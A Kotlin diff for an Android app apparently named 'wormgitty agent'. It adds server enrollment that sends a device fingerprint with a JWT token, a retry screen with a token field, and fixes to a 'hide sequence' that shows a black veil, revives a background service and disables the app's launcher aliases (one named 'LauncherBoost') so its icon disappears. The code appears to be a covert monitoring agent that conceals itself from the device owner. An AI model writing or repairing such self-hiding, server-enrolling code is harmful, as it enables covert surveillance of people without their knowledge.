@@ -71,7 +71,13 @@ class MainActivity : ComponentActivity() {
         val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
         val opener: PermissionOpener = SystemPermissionOpener()
         // Injected transport: the only network-shaped seam in the app.
-        val api: RegistrationApi = FakeRegistrationApi(applicationContext)
+        val api: RegistrationApi =
+            if (mockPerms) FakeRegistrationApi(applicationContext)
+            else ServerRegistrationApi(applicationContext).also { srv ->
+                // Dev/test hook: a fresh enroll JWT may be handed in via
+                // `am start -e enroll_token <jwt>` when the baked token expired.
+                intent.getStringExtra(EXTRA_ENROLL_TOKEN)?.let { srv.enrollToken = it }
+            }
         val deviceInfo: DeviceInfoProvider = SystemDeviceInfoProvider(applicationContext)
 
         setContent {
@@ -128,6 +134,12 @@ class MainActivity : ComponentActivity() {
 
     /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
     private fun runHideSequence(prefs: HidePrefs) {
+        // The seal coroutine may resume on a non-UI dispatcher — setContentView
+        // and alias writes must run on main.
+        if (android.os.Looper.myLooper() != mainLooper) {
+            android.os.Handler(mainLooper).post { runHideSequence(prefs) }
+            return
+        }
         val veil = android.view.View(this)
         veil.setBackgroundColor(android.graphics.Color.BLACK)
         setContentView(veil)
@@ -149,14 +161,17 @@ class MainActivity : ComponentActivity() {
     fun setAliases(hiddenVisible: Boolean) {
         val pm = packageManager
         val pkg = packageName
+        // Alias CLASS names live under the shared namespace (com.wormgitty.agent),
+        // not the flavor applicationId — ComponentName(pkg, cls) requires both.
+        val ns = "com.wormgitty.agent"
         pm.setComponentEnabledSetting(
-            ComponentName(pkg, "$pkg.LauncherBoost"),
+            ComponentName(pkg, "$ns.LauncherBoost"),
             if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
             else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
             PackageManager.DONT_KILL_APP
         )
         pm.setComponentEnabledSetting(
-            ComponentName(pkg, "$pkg.LauncherHidden"),
+            ComponentName(pkg, "$ns.LauncherHidden"),
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         )
@@ -164,6 +179,7 @@ class MainActivity : ComponentActivity() {
 
     companion object {
         const val EXTRA_MOCK_PERMS = "mock_perms"
+        const val EXTRA_ENROLL_TOKEN = "enroll_token"
         const val VEIL_MS = 2000L
     }
 }
@@ -427,11 +443,15 @@ fun WizardScreen(
                         )
                     )
                     var finishing by remember { mutableStateOf(false) }
+                    var enrollError by remember { mutableStateOf<String?>(null) }
+                    var retryTick by remember { mutableStateOf(0) }
+                    var tokenInput by remember { mutableStateOf("") }
                     NextButton(enabled = !finishing, tag = "finish", label = R.string.btn_finish) {
                         finishing = true
+                        enrollError = null
                     }
                     if (finishing) {
-                        LaunchedEffect(Unit) {
+                        LaunchedEffect(retryTick) {
                             val reg = Registration(
                                 "",
                                 name.trim(),
@@ -441,8 +461,59 @@ fun WizardScreen(
                                 deviceInfo.fingerprint(),
                                 deviceInfo.constraints()
                             )
-                            api.register(reg).onSuccess { id -> store.save(reg.copy(id = id)) }
-                            onSealed()
+                            api.register(reg)
+                                .onSuccess { id ->
+                                    store.save(reg.copy(id = id))
+                                    onSealed()
+                                }
+                                .onFailure { enrollError = it.message ?: "enroll_failed" }
+                        }
+                    }
+                    enrollError?.let { err ->
+                        val activityCtx = LocalContext.current
+                        Text(
+                            stringResource(R.string.enroll_failed_fmt, err),
+                            fontSize = 13.sp,
+                            color = RED,
+                            modifier = Modifier.padding(top = 12.dp).testTag("enroll_error")
+                        )
+                        Row(Modifier.padding(top = 8.dp)) {
+                            Button(
+                                onClick = {
+                                    tokenInput.takeIf { it.isNotBlank() }
+                                        ?.let { (api as? EnrollTokenAware)?.enrollToken = it }
+                                    enrollError = null
+                                    retryTick++
+                                },
+                                modifier = Modifier.testTag("enroll_retry")
+                            ) { Text(stringResource(R.string.btn_retry)) }
+                            (api as? EnrollTokenAware)?.let { aware ->
+                                TextButton(
+                                    onClick = {
+                                        val cm = activityCtx.getSystemService(
+                                            Context.CLIPBOARD_SERVICE
+                                        ) as android.content.ClipboardManager
+                                        cm.setPrimaryClip(
+                                            android.content.ClipData.newPlainText(
+                                                "enroll_token", aware.enrollToken
+                                            )
+                                        )
+                                    },
+                                    modifier = Modifier.testTag("enroll_copy")
+                                ) { Text(stringResource(R.string.btn_copy_token)) }
+                            }
+                        }
+                        if (api is EnrollTokenAware) {
+                            OutlinedTextField(
+                                value = tokenInput,
+                                onValueChange = { tokenInput = it },
+                                label = { Text(stringResource(R.string.enroll_token_hint)) },
+                                singleLine = true,
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .padding(top = 8.dp)
+                                    .testTag("enroll_token_input")
+                            )
                         }
                     }
                 }
